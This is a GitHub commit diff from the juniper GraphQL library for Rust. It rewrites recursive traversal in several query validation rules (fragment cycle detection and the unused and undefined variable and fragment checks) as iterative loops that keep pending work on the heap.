|  |  | fn detect\_from(&mut self, from: &'a str, path: &mut Vec<&'a Spanning<&'a str>>) { |
|  |  | fn detect\_from(&mut self, from: &'a str) { |
|  |  | let mut to\_visit = Vec::new(); |
|  |  | to\_visit.push((from, Vec::new(), HashMap::new())); |
|  |  |  |
|  |  | while let Some((from, path, path\_indices)) = to\_visit.pop() { |
|  |  | to\_visit.extend(self.detect\_from\_inner(from, path, path\_indices)); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | /// This function should be called only inside [`Self::detect\_from()`], as |
|  |  | /// it's a recursive function using heap instead of a stack. So, instead of |
|  |  | /// the recursive call, we return a [`Vec`] that is visited inside |
|  |  | /// [`Self::detect\_from()`]. |
|  |  | fn detect\_from\_inner( |
|  |  | &mut self, |
|  |  | from: &'a str, |
|  |  | path: Vec<&'a Spanning<&'a str>>, |
|  |  | mut path\_indices: HashMap<&'a str, usize>, |
|  |  | ) -> Vec<CycleDetectorState<'a>> { |
|  |  | self.visited.insert(from); |
|  |  |  |
|  |  | if !self.spreads.contains\_key(from) { |
|  |  | return; |
|  |  | return Vec::new(); |
|  |  | } |
|  |  |  |
|  |  | self.path\_indices.insert(from, path.len()); |
|  |  | path\_indices.insert(from, path.len()); |
|  |  |  |
|  |  | let mut to\_visit = Vec::new(); |
|  |  | for node in &self.spreads[from] { |
|  |  | let name = &node.item; |
|  |  | let index = self.path\_indices.get(name).cloned(); |
|  |  | let name = node.item; |
|  |  | let index = path\_indices.get(name).cloned(); |
|  |  |  |
|  |  | if let Some(index) = index { |
|  |  | let err\_pos = if index < path.len() { |
| Expand All | | @@ -114,14 +132,14 @@ impl<'a> CycleDetector<'a> { |
|  |  |  |
|  |  | self.errors |
|  |  | .push(RuleError::new(&error\_message(name), &[err\_pos.start])); |
|  |  | } else if !self.visited.contains(name) { |
|  |  | } else { |
|  |  | let mut path = path.clone(); |
|  |  | path.push(node); |
|  |  | self.detect\_from(name, path); |
|  |  | path.pop(); |
|  |  | to\_visit.push((name, path, path\_indices.clone())); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | self.path\_indices.remove(from); |
|  |  | to\_visit |
|  |  | } |
|  |  | } |
|  |  |  |
| Expand Down | |  |

48 changes: 35 additions & 13 deletions

48
[juniper/src/validation/rules/no\_undefined\_variables.rs](#diff-e24aa0fa8ab9f5b91ad784c50242ff9331d76f6fff074f7df4ae5304b9fbe40a "juniper/src/validation/rules/no_undefined_variables.rs")

Show comments

[View file](/graphql-rust/juniper/blob/2b609ee057be950e3454b69fadc431d120e407bb/juniper/src/validation/rules/no_undefined_variables.rs)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -12,13 +12,6 @@ pub enum Scope<'a> { |
|  |  | Fragment(&'a str), |
|  |  | } |
|  |  |  |
|  |  | pub struct NoUndefinedVariables<'a> { |
|  |  | defined\_variables: HashMap<Option<&'a str>, (SourcePosition, HashSet<&'a str>)>, |
|  |  | used\_variables: HashMap<Scope<'a>, Vec<Spanning<&'a str>>>, |
|  |  | current\_scope: Option<Scope<'a>>, |
|  |  | spreads: HashMap<Scope<'a>, Vec<&'a str>>, |
|  |  | } |
|  |  |  |
|  |  | pub fn factory<'a>() -> NoUndefinedVariables<'a> { |
|  |  | NoUndefinedVariables { |
|  |  | defined\_variables: HashMap::new(), |
| Expand All | | @@ -28,6 +21,13 @@ pub fn factory<'a>() -> NoUndefinedVariables<'a> { |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | pub struct NoUndefinedVariables<'a> { |
|  |  | defined\_variables: HashMap<Option<&'a str>, (SourcePosition, HashSet<&'a str>)>, |
|  |  | used\_variables: HashMap<Scope<'a>, Vec<Spanning<&'a str>>>, |
|  |  | current\_scope: Option<Scope<'a>>, |
|  |  | spreads: HashMap<Scope<'a>, Vec<&'a str>>, |
|  |  | } |
|  |  |  |
|  |  | impl<'a> NoUndefinedVariables<'a> { |
|  |  | fn find\_undef\_vars( |
|  |  | &'a self, |
| Expand All | | @@ -36,8 +36,34 @@ impl<'a> NoUndefinedVariables<'a> { |
|  |  | unused: &mut Vec<&'a Spanning<&'a str>>, |
|  |  | visited: &mut HashSet<Scope<'a>>, |
|  |  | ) { |
|  |  | let mut to\_visit = Vec::new(); |
|  |  | if let Some(spreads) = self.find\_undef\_vars\_inner(scope, defined, unused, visited) { |
|  |  | to\_visit.push(spreads); |
|  |  | } |
|  |  | while let Some(spreads) = to\_visit.pop() { |
|  |  | for spread in spreads { |
|  |  | if let Some(spreads) = |
|  |  | self.find\_undef\_vars\_inner(&Scope::Fragment(spread), defined, unused, visited) |
|  |  | { |
|  |  | to\_visit.push(spreads); |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | /// This function should be called only inside [`Self::find\_undef\_vars()`], |
|  |  | /// as it's a recursive function using heap instead of a stack. So, instead |
|  |  | /// of the recursive call, we return a [`Vec`] that is visited inside |
|  |  | /// [`Self::find\_undef\_vars()`]. |
|  |  | fn find\_undef\_vars\_inner( |
|  |  | &'a self, |
|  |  | scope: &Scope<'a>, |
|  |  | defined: &HashSet<&'a str>, |
|  |  | unused: &mut Vec<&'a Spanning<&'a str>>, |
|  |  | visited: &mut HashSet<Scope<'a>>, |
|  |  | ) -> Option<&'a Vec<&'a str>> { |
|  |  | if visited.contains(scope) { |
|  |  | return; |
|  |  | return None; |
|  |  | } |
|  |  |  |
|  |  | visited.insert(scope.clone()); |
| Expand All | | @@ -50,11 +76,7 @@ impl<'a> NoUndefinedVariables<'a> { |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | if let Some(spreads) = self.spreads.get(scope) { |
|  |  | for spread in spreads { |
|  |  | self.find\_undef\_vars(&Scope::Fragment(spread), defined, unused, visited); |
|  |  | } |
|  |  | } |
|  |  | self.spreads.get(scope) |
|  |  | } |
|  |  | } |
|  |  |  |
| Expand Down | |  |

45 changes: 30 additions & 15 deletions

45
[juniper/src/validation/rules/no\_unused\_fragments.rs](#diff-033339124f4e8d264c74a163f6d9e753b378964fd9fb72814c928c4bd9f14dbe "juniper/src/validation/rules/no_unused_fragments.rs")

Show comments

[View file](/graphql-rust/juniper/blob/2b609ee057be950e3454b69fadc431d120e407bb/juniper/src/validation/rules/no_unused_fragments.rs)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -13,12 +13,6 @@ pub enum Scope<'a> { |
|  |  | Fragment(&'a str), |
|  |  | } |
|  |  |  |
|  |  | pub struct NoUnusedFragments<'a> { |
|  |  | spreads: HashMap<Scope<'a>, Vec<&'a str>>, |
|  |  | defined\_fragments: HashSet<Spanning<&'a str>>, |
|  |  | current\_scope: Option<Scope<'a>>, |
|  |  | } |
|  |  |  |
|  |  | pub fn factory<'a>() -> NoUnusedFragments<'a> { |
|  |  | NoUnusedFragments { |
|  |  | spreads: HashMap::new(), |
| Expand All | | @@ -27,22 +21,43 @@ pub fn factory<'a>() -> NoUnusedFragments<'a> { |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | pub struct NoUnusedFragments<'a> { |
|  |  | spreads: HashMap<Scope<'a>, Vec<&'a str>>, |
|  |  | defined\_fragments: HashSet<Spanning<&'a str>>, |
|  |  | current\_scope: Option<Scope<'a>>, |
|  |  | } |
|  |  |  |
|  |  | impl<'a> NoUnusedFragments<'a> { |
|  |  | fn find\_reachable\_fragments(&self, from: &Scope<'a>, result: &mut HashSet<&'a str>) { |
|  |  | fn find\_reachable\_fragments(&'a self, from: &Scope<'a>, result: &mut HashSet<&'a str>) { |
|  |  | let mut to\_visit = Vec::new(); |
|  |  | if let Scope::Fragment(name) = \*from { |
|  |  | if result.contains(name) { |
|  |  | return; |
|  |  | } else { |
|  |  | result.insert(name); |
|  |  | } |
|  |  | to\_visit.push(name); |
|  |  | } |
|  |  |  |
|  |  | if let Some(spreads) = self.spreads.get(from) { |
|  |  | for spread in spreads { |
|  |  | self.find\_reachable\_fragments(&Scope::Fragment(spread), result) |
|  |  | while let Some(from) = to\_visit.pop() { |
|  |  | if let Some(next) = self.find\_reachable\_fragments\_inner(from, result) { |
|  |  | to\_visit.extend(next); |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | /// This function should be called only inside |
|  |  | /// [`Self::find\_reachable\_fragments()`], as it's a recursive function using |
|  |  | /// heap instead of a stack. So, instead of the recursive call, we return a |
|  |  | /// [`Vec`] that is visited inside [`Self::find\_reachable\_fragments()`]. |
|  |  | fn find\_reachable\_fragments\_inner( |
|  |  | &'a self, |
|  |  | from: &'a str, |
|  |  | result: &mut HashSet<&'a str>, |
|  |  | ) -> Option<&'a Vec<&'a str>> { |
|  |  | if result.contains(from) { |
|  |  | return None; |
|  |  | } else { |
|  |  | result.insert(from); |
|  |  | } |
|  |  |  |
|  |  | self.spreads.get(&Scope::Fragment(from)) |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | impl<'a, S> Visitor<'a, S> for NoUnusedFragments<'a> |
| Expand Down | |  |

50 changes: 36 additions & 14 deletions

50
[juniper/src/validation/rules/no\_unused\_variables.rs](#diff-73ea1541d9b2224e1a56368379132953f9036c62abb9f75bf711d92ecdae0942 "juniper/src/validation/rules/no_unused_variables.rs")

Show comments

[View file](/graphql-rust/juniper/blob/2b609ee057be950e3454b69fadc431d120e407bb/juniper/src/validation/rules/no_unused_variables.rs)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -12,13 +12,6 @@ pub enum Scope<'a> { |
|  |  | Fragment(&'a str), |
|  |  | } |
|  |  |  |
|  |  | pub struct NoUnusedVariables<'a> { |
|  |  | defined\_variables: HashMap<Option<&'a str>, HashSet<&'a Spanning<&'a str>>>, |
|  |  | used\_variables: HashMap<Scope<'a>, Vec<&'a str>>, |
|  |  | current\_scope: Option<Scope<'a>>, |
|  |  | spreads: HashMap<Scope<'a>, Vec<&'a str>>, |
|  |  | } |
|  |  |  |
|  |  | pub fn factory<'a>() -> NoUnusedVariables<'a> { |
|  |  | NoUnusedVariables { |
|  |  | defined\_variables: HashMap::new(), |
| Expand All | | @@ -28,16 +21,49 @@ pub fn factory<'a>() -> NoUnusedVariables<'a> { |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | pub struct NoUnusedVariables<'a> { |
|  |  | defined\_variables: HashMap<Option<&'a str>, HashSet<&'a Spanning<&'a str>>>, |
|  |  | used\_variables: HashMap<Scope<'a>, Vec<&'a str>>, |
|  |  | current\_scope: Option<Scope<'a>>, |
|  |  | spreads: HashMap<Scope<'a>, Vec<&'a str>>, |
|  |  | } |
|  |  |  |
|  |  | impl<'a> NoUnusedVariables<'a> { |
|  |  | fn find\_used\_vars( |
|  |  | &self, |
|  |  | &'a self, |
|  |  | from: &Scope<'a>, |
|  |  | defined: &HashSet<&'a str>, |
|  |  | used: &mut HashSet<&'a str>, |
|  |  | visited: &mut HashSet<Scope<'a>>, |
|  |  | ) { |
|  |  | let mut to\_visit = Vec::new(); |
|  |  | if let Some(spreads) = self.find\_used\_vars\_inner(from, defined, used, visited) { |
|  |  | to\_visit.push(spreads); |
|  |  | } |
|  |  | while let Some(spreads) = to\_visit.pop() { |
|  |  | for spread in spreads { |
|  |  | if let Some(spreads) = |
|  |  | self.find\_used\_vars\_inner(&Scope::Fragment(spread), defined, used, visited) |
|  |  | { |
|  |  | to\_visit.push(spreads); |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | /// This function should be called only inside [`Self::find\_used\_vars()`], |
|  |  | /// as it's a recursive function using heap instead of a stack. So, instead |
|  |  | /// of the recursive call, we return a [`Vec`] that is visited inside |
|  |  | /// [`Self::find\_used\_vars()`]. |
|  |  | fn find\_used\_vars\_inner( |
|  |  | &'a self, |
|  |  | from: &Scope<'a>, |
|  |  | defined: &HashSet<&'a str>, |
|  |  | used: &mut HashSet<&'a str>, |
|  |  | visited: &mut HashSet<Scope<'a>>, |
|  |  | ) -> Option<&'a Vec<&'a str>> { |
|  |  | if visited.contains(from) { |
|  |  | return; |
|  |  | return None; |
|  |  | } |
|  |  |  |
|  |  | visited.insert(from.clone()); |
| Expand All | | @@ -50,11 +76,7 @@ impl<'a> NoUnusedVariables<'a> { |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | if let Some(spreads) = self.spreads.get(from) { |
|  |  | for spread in spreads { |
|  |  | self.find\_used\_vars(&Scope::Fragment(spread), defined, used, visited); |
|  |  | } |
|  |  | } |
|  |  | self.spreads.get(from) |
|  |  | } |
|  |  | } |
|  |  |  |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `2b609ee`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgraphql-rust%2Fjuniper%2Fcommit%2F2b609ee057be950e3454b69fadc431d120e407bb) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


